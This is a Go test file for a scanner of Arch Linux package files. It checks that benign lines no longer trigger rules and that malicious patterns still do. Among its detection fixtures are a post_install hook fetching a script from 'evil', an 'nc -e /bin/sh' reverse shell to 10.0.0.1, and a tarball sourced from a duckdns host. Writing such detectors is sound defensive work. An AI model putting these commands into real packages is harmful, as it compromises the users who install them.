package rules

import "testing"

// Reproduces every false positive reported in issue #10. Each case must NOT
// produce the named rule code.
func TestIssue10FalsePositives(t *testing.T) {
	type fp struct {
		name, file, content, mustNotFire string
	}
	cases := []fp{
		{"commented-source", "PKGBUILD",
			"#source=(\"https://gist.githubusercontent.com/x/raw/svp4-linux.$pkgver.tar.bz2\")", "URL-002"},
		{"commented-maintainer", "PKGBUILD",
			"# Maintainer: Alexander Jacocks <alexander@redhat.com>", "URL-002"},
		{"redhat-url-srcinfo", ".SRCINFO", "url = https://www.redhat.com", "URL-002"},
		{"redhat-url-pkgbuild", "PKGBUILD", "url='https://www.redhat.com'", "URL-002"},
		{"redhat-email-patch", "x.patch", "From: Florian Weimer <fweimer@redhat.com>", "URL-002"},
		{"license-srcinfo", ".SRCINFO", "license = CC-BY-NC-SA-3.0", "INSTALL-003"},
		{"license-pkgbuild", "PKGBUILD", "license=('CC-BY-NC-SA-3.0')", "INSTALL-003"},
		{"desktop-name", "zen.desktop", "Name[ca]=Finestra en blanc nova", "INSTALL-003"},
		{"patch-c-code", "autofs.patch", "ret = krb5_cc_get_principal(ctxt, &def_princ);", "INSTALL-003"},
		{"patch-ptr", "autofs.patch", "master->nc = NULL;", "INSTALL-003"},
		{"sig-base64", "autofs.patch.sign", "zCvZMyBUehxupRGRK7LJIAqhsd0Z2Ab7VGGenY6h36ObzNC+VhcB1MIINFY", "INSTALL-003"},
		{"github-src", "PKGBUILD", "source=(\"git+https://github.com/nomacs/nomacs.git#tag=${pkgver}\")", "SRC-001"},
		{"gitlab-src", "PKGBUILD", "source=(\"git+https://gitlab.gnome.org/GNOME/gtk.git\")", "SRC-001"},
		{"kde-src", "PKGBUILD", "source=(\"git+https://invent.kde.org/foo/bar.git\")", "SRC-001"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			for _, h := range Scan(map[string]string{c.file: c.content}) {
				if h.Code == c.mustNotFire {
					t.Errorf("false positive %s on %q: snippet=%q", h.Code, c.content, h.Snippet)
				}
			}
		})
	}
}

// The fixes must not blind the scanner to real threats.
func TestIssue10TruePositivesStillFire(t *testing.T) {
	type tp struct{ name, file, content, mustFire string }
	cases := []tp{
		{"real-shortener", "PKGBUILD", `source=("https://bit.ly/3xYz")`, "URL-002"},
		{"twitter-shortener", "PKGBUILD", `source=("https://t.co/abcd")`, "URL-002"},
		{"install-curl", "x.install", "post_install() { curl http://evil/s.sh; }", "INSTALL-003"},
		{"install-nc", "x.install", "post_install() { nc -e /bin/sh 10.0.0.1 4444; }", "INSTALL-003"},
		{"uncommon-git-host", "PKGBUILD", `source=("git+https://random-vps.example.net/u/r.git")`, "SRC-001"},
		{"live-not-commented", "PKGBUILD", "url='https://bit.ly/x'\n#url='https://example.com'", "URL-002"},
		{"ddns", "PKGBUILD", `source=("https://evil.duckdns.org/p.tar.gz")`, "URL-003"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := false
			for _, h := range Scan(map[string]string{c.file: c.content}) {
				if h.Code == c.mustFire {
					got = true
				}
			}
			if !got {
				t.Errorf("expected %s to fire on %q", c.mustFire, c.content)
			}
		})
	}
}
